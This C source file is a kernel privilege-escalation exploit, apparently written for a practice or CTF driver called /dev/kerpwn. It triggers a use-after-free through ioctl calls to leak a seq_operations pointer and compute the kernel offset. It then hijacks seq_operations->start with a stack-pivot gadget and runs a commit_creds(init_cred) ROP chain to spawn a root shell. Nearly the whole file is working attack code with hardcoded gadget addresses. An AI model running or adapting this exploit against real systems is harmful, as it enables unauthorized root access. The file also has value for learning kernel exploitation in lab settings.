#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include "../kernelpwn.h"

#define SINGLE_START 0xffffffff81319d30
size_t pop_rdi = 0xffffffff81089250; // pop rdi ; ret
size_t add_rsp_0x1a8 = 0xFFFFFFFF810B2802; 
size_t init_cred = 0xffffffff82663300;
size_t commit_creds = 0xffffffff810c8d40;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00f39;
size_t kernel_offset;
int seq_fd, fd;
size_t buf[0x20] = { 0 };


struct node {
	size_t idx;
	size_t len;
	char* ptr;
};

void add(size_t len, char* ptr)
{
	struct node n = { .idx = len, .len = (size_t)ptr };
	ioctl(fd, 32, &n);
}

void dele(size_t idx)
{
	struct node n = { .idx = idx };
	ioctl(fd, 48, &n);
}

void edit(size_t idx, size_t len, char* ptr)
{
	struct node n = { .idx = idx, .len = len, .ptr = ptr };
	ioctl(fd, 80, &n);
}

void show(size_t idx, size_t len, char* ptr)
{
	struct node n = { .idx = idx, .len = len, .ptr = ptr };
	ioctl(fd, 64, &n);
}


int main(int argc, char** argv, char** env)
{
	bind_core(0);
	fd = open("/dev/kerpwn", O_RDWR);
	add(0x20, buf);
	dele(0);
	
	//for (i = 0; i < 0x80; i++)
	seq_fd = open("/proc/self/stat", O_RDONLY);
	show(0, 0x20, buf);
	if ((buf[0]&0xfff) != (SINGLE_START&0xfff))
		err_exit("Failed to leak kernel address");
	
	kernel_offset = buf[0] - SINGLE_START;
	binary_dump("seq_operations", buf, 0x20);
	hexx("kernel_offset", kernel_offset);
        
	//buf[0] = pop_rdi+kernel_offset;
	buf[0] = add_rsp_0x1a8+kernel_offset;
	hexx("buf[0] <==> seq_operations->start", buf[0]);
	edit(0, 8, buf);

	pop_rdi += kernel_offset;
	init_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_restore_regs_and_return_to_usermode += kernel_offset;
	__asm__ volatile(
	"mov r15, 0x00000000;"
	"mov r14, pop_rdi;"
	"mov r13, init_cred;"
	"mov r12, commit_creds;"
	"mov rbp, swapgs_restore_regs_and_return_to_usermode;"
	"mov rbx, 0x55555555;"
	"mov r11, 0x66666666;"
	"mov r10, 0x77777777;"
	"mov r9,  0x88888888;"
	"mov r8,  0x99999999;"
	//"xor rax, rax;"
	"mov rcx, 0xbbbbbbbb");
	//"mov rdx, 0x20;"
	//"mov rsi, buf;"
	//"mov rdi, seq_fd;"
	//"syscall");
	read(seq_fd, buf, 0x20);
	if (!getuid())	info("Get root privilege"), system("/bin/sh");
	else err_exit("Failed to get root privilege");
	return 0;
}
